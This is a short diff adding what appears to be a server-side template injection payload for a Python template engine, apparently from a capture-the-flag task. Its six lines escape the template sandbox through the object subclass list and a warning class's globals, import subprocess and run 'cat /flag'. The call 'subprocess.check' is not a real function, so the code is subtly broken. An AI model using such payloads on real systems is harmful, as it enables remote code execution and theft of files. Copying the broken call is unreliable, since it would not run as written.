@@ -1,0 +1,6 @@
+% a=[].__class__.__base__.__subclasses__()
+% b=[c for c in a if 'warning' in str(c)][0].__init__.__globals__
+% c=b['__builtins__']
+% d=c['__import__']('subprocess')
+% e=d.check('cat /flag')
+{{e}}
